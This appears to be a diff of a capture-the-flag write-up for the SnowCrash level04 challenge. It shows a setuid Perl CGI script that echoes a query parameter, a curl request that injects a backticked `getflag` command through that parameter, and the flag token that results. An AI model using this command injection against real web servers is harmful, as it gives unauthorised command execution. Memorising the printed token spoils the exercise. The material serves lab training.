@@ -1,5 +1,17 @@
-level04@SnowCrash:~$ ls
-level04.pl
+We realize there is a perl scrip in our home folder with suid permissions
+
+level04@SnowCrash:~$ ls -al
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+
+
+The script seems to be a cgi script for a server listening on port 4747:
+
 level04@SnowCrash:~$ cat level04.pl
 #!/usr/bin/perl
 # localhost:4747
@@ -11,7 +23,9 @@ sub x {
 }
 x(param("x"));
 
-We see that the CGi is executing echo with the 'x' query parameter, so we can send this payload which executes the getflag command:
+
+We see that the CGi is executing echo with the 'x' query parameter, so we try to inject the getflag command to check if the cgi, with suid permissions, can execute it for us:
 
 level04@SnowCrash:~$ curl -s 'localhost:4747?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
